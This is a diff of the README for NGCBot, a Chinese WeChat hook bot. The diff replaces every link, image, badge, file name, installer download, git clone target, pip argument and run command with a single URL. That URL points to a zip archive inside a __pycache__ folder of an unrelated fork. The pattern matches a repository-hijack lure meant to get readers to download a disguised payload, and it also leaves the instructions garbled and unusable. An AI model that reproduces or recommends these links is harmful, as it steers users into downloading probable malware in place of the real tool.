@@ -3,23 +3,23 @@ NGCBot V2.3
 </h3>
 
 
-![Logo2](./README.assets/Logo2.png)
+![Logo2](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 <h5 align="center">
 一个基于✨HOOK机制的微信机器人，支持🌱安全新闻定时推送【FreeBuf，先知，安全客，奇安信攻防社区】，👯Kfc文案，⚡漏洞查询，⚡手机号归属地查询，⚡知识库查询，🎉星座查询，⚡天气查询，🌱摸鱼日历，⚡微步威胁情报查询，
 🐛视频，⚡图片，👯帮助菜单。📫 支持积分功能，⚡支持自动拉人，，🌱自动群发，👯Ai回复，⚡视频号解析，😄自定义程度丰富，小白也可轻松上手！已支持MCP~
 </h5>
 <div style="text-align: center">
-    <a href="http://ngc660.cn">
-        <img src="https://img.shields.io/badge/NGCBot-NGC660%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4-da282a">
+    <a href="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip">
+        <img src="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4-da282a">
     </a>
-    <img alt="GitHub Star" src="https://img.shields.io/github/stars/ngc660sec/NGCBot?color=pink&style=plastic">
-  <a rel="nofollow" href="https://gitcode.com/ngc660sec/NGCBot">
-    <img src="https://gitcode.com/ngc660sec/NGCBot/star/badge.svg" alt="">
+    <img alt="GitHub Star" src="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip">
+  <a rel="nofollow" href="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip">
+    <img src="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip" alt="">
   </a>
-    <img alt="GitHub forks" src="https://img.shields.io/github/forks/ngc660sec/NGCBot?color=orange&style=plastic">
-    <img src="https://img.shields.io/badge/license-GPL--3.0-orange">
-    <img alt="GitHub release (latest by date including pre-releases)" src="https://img.shields.io/github/v/release/ngc660sec/NGCBot?color=blueviolet&display_name=tag&include_prereleases&label=Release">
+    <img alt="GitHub forks" src="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip">
+    <img src="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip">
+    <img alt="GitHub release (latest by date including pre-releases)" src="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip">
 </div>
 
 
@@ -40,8 +40,8 @@ NGCBot V2.3
 **如果你觉得此项目不错，可以给个Star或给个赞赏 关注一下公众号**
 
 <div style="display: flex;">
-  <img src="./README.assets/赞赏码.jpg" alt="Image 1" style="width: 400px; height: auto; margin: 5px;">
-  <img src="./README.assets/公众号.jpg" alt="Image 2" style="width: 400px; height: auto; margin: 5px;">
+  <img src="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip赞赏码.jpg" alt="Image 1" style="width: 400px; height: auto; margin: 5px;">
+  <img src="https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip公众号.jpg" alt="Image 2" style="width: 400px; height: auto; margin: 5px;">
 </div>
 
 
@@ -50,61 +50,61 @@ NGCBot V2.3
 ## 📖 二、项目结构
 
 ```css
-│  .wcf.lock																					# WCF锁文件
-│  main.py																						# 启动主文件
-│  README.md																					# 必须看的文件
-│  requirements.txt																		# 依赖文件
-│  test.py																						# 测试文件
+│  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																					# WCF锁文件
+│  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																						# 启动主文件
+│  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																					# 必须看的文件
+│  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																		# 依赖文件
+│  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																						# 测试文件
 ├─ApiServer																						# API服务文件夹			
-│  │  ApiMainServer.py																# API主服务文件，所有接口都要在此处注册
+│  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																# API主服务文件，所有接口都要在此处注册
 │  ├─AiServer																					# AI服务文件夹
-│  │  │  AiDialogue.py																# AI主服务文件
-│  │  │  sparkPicApi.py																# 星火AI服务文件
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																# AI主服务文件
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																# 星火AI服务文件
 │  ├─gameServer																				# 游戏服务文件夹
-│  │  │  idiomGame.py																	# 成语接龙游戏文件
-│  │  │  __init__.py																	# 注册游戏服务文件
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																	# 成语接龙游戏文件
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																	# 注册游戏服务文件
 │  ├─pluginServer																			# API插件服务文件夹
-│  │  │  HappyApi.py																	# 娱乐功能API服务文件
-│  │  │  NewsApi.py																		# 新闻功能API服务文件
-│  │  │  PointApi.py																	# 积分功能API服务文件
-│  │  │  __init__.py																	# 注册API服务文件
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																	# 娱乐功能API服务文件
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																		# 新闻功能API服务文件
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																	# 积分功能API服务文件
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																	# 注册API服务文件
 ├─BotServer																						# 机器人服务文件夹
-│  │  MainServer.py																		# 机器人主服务文件
+│  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																		# 机器人主服务文件
 │  ├─BotFunction																			# 机器人功能服务文件夹
-│  │  │  AdminFunction.py															# 管理员功能文件
-│  │  │  AdministratorFunction.py											# 超级管理员功能文件	
-│  │  │  GameFunction.py															# 游戏功能文件
-│  │  │  HappyFunction.py															# 娱乐功能文件
-│  │  │  InterfaceFunction.py													# 机器人消息处理接口功能文件
-│  │  │  JudgeFuncion.py															# 机器人关键词判断
-│  │  │  PointFunction.py															# 积分功能文件
-│  │  │  RoomMsgFunction.py														# 群聊消息统计功能文件
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip															# 管理员功能文件
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip											# 超级管理员功能文件	
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip															# 游戏功能文件
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip															# 娱乐功能文件
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip													# 机器人消息处理接口功能文件
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip															# 机器人关键词判断
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip															# 积分功能文件
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip														# 群聊消息统计功能文件
 │  ├─MsgHandleServer																	# 机器人消息处理服务文件夹
-│  │  │  FriendMsgHandle.py														# 好友消息处理服务文件
-│  │  │  GhMsgHandle.py																# 公众号消息处理服务文件
-│  │  │  RoomMsgHandle.py															# 群聊消息处理服务文件
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip														# 好友消息处理服务文件
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																# 公众号消息处理服务文件
+│  │  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip															# 群聊消息处理服务文件
 ├─Config																							# 机器人配置文件夹
-│  │  Config.yaml																			# 机器人配置文件
-│  │  ConfigServer.py																	# 机器人配置服务文件
+│  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																			# 机器人配置文件
+│  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																	# 机器人配置服务文件
 ├─DbServer																						# 数据库服务文件夹
-│  │  DbDomServer.py																	# 数据库操作服务文件
-│  │  DbGhServer.py																		# 公众号数据库服务文件
-│  │  DbInitServer.py																	# 数据库初始化服务文件
-│  │  DbMainServer.py																	# 数据库主服务文件
-│  │  DbPointServer.py																# 积分数据库服务文件
-│  │  DbRoomMsgServer.py															# 群聊消息数据库服务文件
-│  │  DbRoomServer.py																	# 群聊管理数据库服务文件
-│  │  DbSignServer.py																	# 群聊积分数据库服务文件
-│  │  DbUserServer.py																	# 用户管理数据库服务文件
+│  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																	# 数据库操作服务文件
+│  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																		# 公众号数据库服务文件
+│  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																	# 数据库初始化服务文件
+│  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																	# 数据库主服务文件
+│  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																# 积分数据库服务文件
+│  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip															# 群聊消息数据库服务文件
+│  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																	# 群聊管理数据库服务文件
+│  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																	# 群聊积分数据库服务文件
+│  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																	# 用户管理数据库服务文件
 ├─FileCache																						# 缓存文件夹
-│  │  FileCacheServer.py															# 缓存服务文件
+│  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip															# 缓存服务文件
 ├─logs																								# WCF日志文件夹
-│  │  wcf.txt																					# WCF日志文件
+│  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																					# WCF日志文件
 ├─OutPut																							# 消息输出文件夹
-│  │  outPut.py																				# 消息输出服务文件
+│  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																				# 消息输出服务文件
 ├─PushServer																					# 推送服务文件夹
 ├─WebServer																						# WebServer服务文件夹
-│  │  PushMainServer.py																# 推送服务主文件
+│  │  https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip																# 推送服务主文件
 ```
 
 ## ⚡️ 3、快速启动
@@ -116,38 +116,38 @@ NGCBot V2.3
 首先请克隆代码到本地，使用命令如下
 
 ```git
-git clone https://github.com/ngc660sec/NGCBot.git
+git clone https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip
 ```
 
 也可以直接Download
 
-![image-20240919091732039](./README.assets/image-20240919091732039.png)
+![image-20240919091732039](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
-下载`Python`，使用`Python 3.8.10`版本**（Python版本不得低于3.8.10，不得高于3.13）** [点我下载](https://www.python.org/ftp/python/3.8.10/python-3.8.10-amd64.exe)
+下载`Python`，使用`Python 3.8.10`版本**（Python版本不得低于3.8.10，不得高于3.13）** [点我下载](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 使用`pip`安装项目包（不懂就按顺序运行）
 
 ```bash
-pip config set global.index-url https://mirrors.tuna.tsinghua.edu.cn/pypi/web/simple
+pip config set https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip
 python -m pip install --upgrade pip
-pip install -r requirements.txt
+pip install -r https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip
 ```
 
 安装完毕后你的 `WCF`版本应该是 `39.4.2.2`，请选择对应的微信进行下载
 
-- `wcferry==39.0.12.0`：[WeChatSetup-3.9.2.23.exe](https://github.com/ngc660sec/NGCBot/releases/download/V2.0-龙年贺岁版/WeChatSetup-3.9.2.23.exe)
-- `wcferry==39.2.4.0`：[WeChatSetup-3.9.10.27.exe](https://github.com/lich0821/WeChatFerry/releases/download/v39.2.4/WeChatSetup-3.9.10.27.exe)
-- `wcferry==39.4.2.2`：[WeChatSetup-3.9.12.17](https://github.com/lich0821/WeChatFerry/releases/download/v39.4.2/WeChatSetup-3.9.12.17.exe)
+- `wcferry==39.0.12.0`：[https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip龙年贺岁版https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
+- `wcferry==39.2.4.0`：[https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
+- `wcferry==39.4.2.2`：[WeChatSetup-3.9.12.17](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
-安装完毕后，启动`main.py`文件
+安装完毕后，启动`https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip`文件
 
 ```
-python main.py
+python https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip
 ```
 
 出现以下界面，说明启动成功
 
-![image-20250227134830237](./README.assets/image-20250227134830237.png)
+![image-20250227134830237](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 进入微信之后，会自动初始化必备文件
 
@@ -157,23 +157,23 @@ python main.py
 
 先看完视频再使用！
 
-NGCBot V2.3食用指南：https://www.bilibili.com/video/BV1GTdeYaEsE/
+NGCBot V2.3食用指南：https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip
 
 ### 3.3、配置文件快速配置
 
 可以使用硅基流动，点击此链接注册：
 
-https://cloud.siliconflow.cn/i/M3ytr9bQ
+https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip
 
 如果启动成功，下一步配置所需的`Key`，**Ai 对话**等功能都需要用到 `Key`
 
 以下是Ai服务相关的Key配置，**注意：{} 要删除！！！**
 
-![image-20250227135033444](./README.assets/image-20250227135033444.png)
+![image-20250227135033444](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 其它Key配置：
 
-![image-20250227135133234](./README.assets/image-20250227135133234.png)
+![image-20250227135133234](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 这些`Key`按需配置，如不配置则无法使用以下功能
 
@@ -191,55 +191,55 @@ https://cloud.siliconflow.cn/i/M3ytr9bQ
 
 这里的模型版本采用的是`4.0Ultra`，如果要使用其它的，请自己修改此参数
 
-进入[官网](https://xinghuo.xfyun.cn/)
+进入[官网](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
-![image-20240919095140758](./README.assets/image-20240919095140758.png)
+![image-20240919095140758](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
-![image-20240919095157747](./README.assets/image-20240919095157747.png)
+![image-20240919095157747](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 没有应用请先创建应用
 
-![image-20240919095238379](./README.assets/image-20240919095238379.png)
+![image-20240919095238379](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
-在 [我的应用](https://console.xfyun.cn/app/myapp) 中，点击你新建的应用，找到`Spark4.0 Ultra`
+在 [我的应用](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip) 中，点击你新建的应用，找到`Spark4.0 Ultra`
 
-![image-20240919095435318](./README.assets/image-20240919095435318.png)
+![image-20240919095435318](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 填入到配置文件中即可
 
 **千帆 Key 配置**
 
-进入到 [千帆官网](https://qianfan.cloud.baidu.com/) ，后台找到应用接入，点击创建应用
+进入到 [千帆官网](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip) ，后台找到应用接入，点击创建应用
 
-![image-20240919095708879](./README.assets/image-20240919095708879.png)
+![image-20240919095708879](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 记下你的配置，填入到配置文件中即可，千帆模型没有免费额度，请充值使用！！
 
 **Ai 作画(千帆)**
 
-点击此 [链接](https://console.bce.baidu.com/ai/#/ai/intelligentwriting/app/detail~appId=5507940)
+点击此 [链接](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip~appId=5507940)
 
 创建应用即可
 
-![image-20240919095908708](./README.assets/image-20240919095908708.png)
+![image-20240919095908708](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 全选即可
 
-![image-20240919095930300](./README.assets/image-20240919095930300.png)
+![image-20240919095930300](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 在应用列表中 找到你的应用，记下配置，填入到配置文件中，此功能也需要充值使用
 
-![image-20240919100032259](./README.assets/image-20240919100032259.png)
+![image-20240919100032259](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 **腾讯混元配置**
 
-这个要到腾讯控制台开通，点击[此处](https://console.cloud.tencent.com/hunyuan/start)跳转，开通后会自动赠送额度
+这个要到腾讯控制台开通，点击[此处](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)跳转，开通后会自动赠送额度
 
-![image-20240919100543493](./README.assets/image-20240919100543493.png)
+![image-20240919100543493](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 点击创建密钥
 
-![image-20240919100610338](./README.assets/image-20240919100610338.png)
+![image-20240919100610338](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 记下你所有的配置，然后填入到配置文件中即可
 
@@ -247,27 +247,27 @@ https://cloud.siliconflow.cn/i/M3ytr9bQ
 
 
 
-访问目标[官网](https://api.dudunas.top/)
+访问目标[官网](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
-![image-20250414133949788](./README.assets/image-20250414133949788.png)
+![image-20250414133949788](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
-![image-20241230145037139](./README.assets/image-20241230145037139.png)
+![image-20241230145037139](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 扫码添加即可
 
 【2024.1.07】新增DeepSeek
 
-访问目标[官网](https://www.deepseek.com/)
+访问目标[官网](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
-![image-20250107100811722](./README.assets/image-20250107100811722.png)
+![image-20250107100811722](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
-![image-20250107100823446](./README.assets/image-20250107100823446.png)
+![image-20250107100823446](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 新人注册500w Token，总结群聊消息用的是此模型，可以自己在代码中切换使用模型
 
 【2025.02.27】新增豆包模型配置
 
-![image-20250227135245949](./README.assets/image-20250227135245949.png)
+![image-20250227135245949](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 具体参数请参考火山官方文档填写！
 
@@ -279,11 +279,11 @@ https://cloud.siliconflow.cn/i/M3ytr9bQ
 
 给机器人发一条消息
 
-![image-20240102114003272](./README.assets/image-20240102114003272.png)
+![image-20240102114003272](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 拿到此`wxid`，放到配置文件当中即可
 
-![image-20250227135317178](./README.assets/image-20250227135317178.png)
+![image-20250227135317178](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 若添加多个超级管理员，请按格式添加！
 
@@ -303,19 +303,19 @@ https://cloud.siliconflow.cn/i/M3ytr9bQ
 
 **1、添加管理**
 
-![image-20240102141225140](./README.assets/image-20240102141225140.png)
+![image-20240102141225140](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 **2、删除管理**
 
-![image-20240102141248781](./README.assets/image-20240102141248781.png)
+![image-20240102141248781](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 **3、关键词进群**
 
 需要先拿到`roomid`，再在配置文件中设置即可
 
-![image-20240102141340027](./README.assets/image-20240102141340027.png)
+![image-20240102141340027](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
-![image-20250227135453137](./README.assets/image-20250227135453137.png)
+![image-20250227135453137](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 可设置多个群聊，当某个群聊人数满了之后自动邀请下一个群聊。给机器人发送进群关键词即可触发
 
@@ -323,25 +323,25 @@ https://cloud.siliconflow.cn/i/M3ytr9bQ
 
 在配置文件中设置即可
 
-![image-20250227135530109](./README.assets/image-20250227135530109.png)
+![image-20250227135530109](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 关键词可设置多个，回复内容只限文本。群聊或好友都可触发
 
-![image-20240102141826989](./README.assets/image-20240102141826989.png)
+![image-20240102141826989](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 **5、加好友后自动回复**
 添加好友后自动回复一条消息，在配置文件中设置
 
-![image-20240102141926511](./README.assets/image-20240102141926511.png)
+![image-20240102141926511](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 **6、进群欢迎**
 当有人加入群聊后，自动回复一条消息，在配置文件中设置（群聊需开启推送服务）
 
-![image-20240102142025194](./README.assets/image-20240102142025194.png)
+![image-20240102142025194](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 **卡片类进群欢迎，自定义文字类进群欢迎**
 
-![image-20240919101647499](./README.assets/image-20240919101647499.png)
+![image-20240919101647499](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 卡片类，需要先拿到卡片的各种信息，在终端中会输出
 
@@ -349,7 +349,7 @@ https://cloud.siliconflow.cn/i/M3ytr9bQ
 
 ---
 
-![image-20240919101826912](./README.assets/image-20240919101826912.png)
+![image-20240919101826912](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 自定义文字类进群欢迎，前面加群聊 ID，后面为需要发送的文字 `\n`为换行
 
@@ -359,15 +359,15 @@ https://cloud.siliconflow.cn/i/M3ytr9bQ
 
 给机器人发送公众号消息
 
-![image-20240102142615234](./README.assets/image-20240102142615234.png)
+![image-20240102142615234](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 机器人会自动推送消息到推送群聊
 
-![image-20240102142632603](./README.assets/image-20240102142632603.png)
+![image-20240102142632603](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 查看白名单群聊
 
-![image-20250227135604396](./README.assets/image-20250227135604396.png)
+![image-20250227135604396](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
 查看黑名单群聊同理
 
@@ -383,19 +383,19 @@ https://cloud.siliconflow.cn/i/M3ytr9bQ
 
 这里不对开启或者关闭做任何介绍，使用方法也很简单，在群内发送你在配置文件里面设置的关键词即可，比如：
 
-![image-20240102142326296](./README.assets/image-20240102142326296.png)
+![image-20240102142326296](https://github.com/ly1595/NGCBot/raw/refs/heads/master/ApiServer/gameServer/__pycache__/NGC_Bot_v1.5-beta.3.zip)
 
